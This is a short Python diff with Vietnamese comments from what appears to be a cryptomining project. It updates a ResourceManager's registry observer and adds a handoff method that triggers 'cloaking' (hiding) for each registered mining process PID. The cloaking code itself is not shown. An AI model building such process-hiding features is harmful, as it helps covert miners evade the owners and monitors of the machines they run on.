@@ -262,10 +262,10 @@ class ResourceManager(IResourceManager):
     def _setup_direct_registry_observer(self):
         """**Setup DirectPIDRegistry Observer** (thiết lập observer DirectPIDRegistry)"""
         try:
-            from mining_environment.scripts.direct_pid_registry import DirectPIDRegistry
+            from pid_logger.direct_registry import get_direct_registry
             
-            registry = DirectPIDRegistry.get_instance()
-            registry.register_observer('resource_manager', self._on_process_registered_direct)
+            registry = get_direct_registry()
+            registry.register_observer(self._on_process_registered_direct)
             self.logger.info("DirectPIDRegistry observer đã đăng ký")
         except Exception as e:
             self.logger.error(f"Lỗi thiết lập DirectPIDRegistry observer: {e}")
@@ -447,6 +447,42 @@ class ResourceManager(IResourceManager):
                 self.logger.error(f"Lỗi tắt NVML: {e}")
 
         self.logger.info("ResourceManager đã tắt")
+
+    def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
+        """
+        **Receive PID from DirectPIDRegistry** (nhận PID từ DirectPIDRegistry)
+        
+        **Critical Interface Method** (phương thức giao diện quan trọng) cho DirectPIDRegistry → ResourceManager handoff.
+        
+        Args:
+            pid: Process ID to apply cloaking
+            registry_metadata: Metadata from DirectPIDRegistry
+            
+        Returns:
+            bool: True if cloaking successfully triggered
+        """
+        try:
+            self.logger.info(f"🔄 [RM-HANDOFF] Nhận PID {pid} từ DirectPIDRegistry")
+            
+            # **Create MiningProcess Object** (tạo đối tượng MiningProcess)
+            mining_process = MiningProcess(
+                pid=pid,
+                name=registry_metadata.get('name', f'process_{pid}'),
+                cmd=registry_metadata.get('cmd', [])
+            )
+            
+            # **Trigger Cloaking System** (kích hoạt hệ thống che giấu)
+            self.logger.info(f"🎯 [RM-HANDOFF] Kích hoạt cloaking cho PID {pid}")
+            self.trigger_cloaking(mining_process, 'direct_registry_handoff')
+            
+            # **Log Success** (ghi log thành công)
+            self.logger.info(f"✅ [RM-HANDOFF] Hoàn thành xử lý PID {pid}")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ [RM-HANDOFF] Lỗi xử lý PID {pid}: {e}")
+            self.logger.error(f"Registry metadata: {registry_metadata}")
+            return False
 
     def stop(self):
         """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
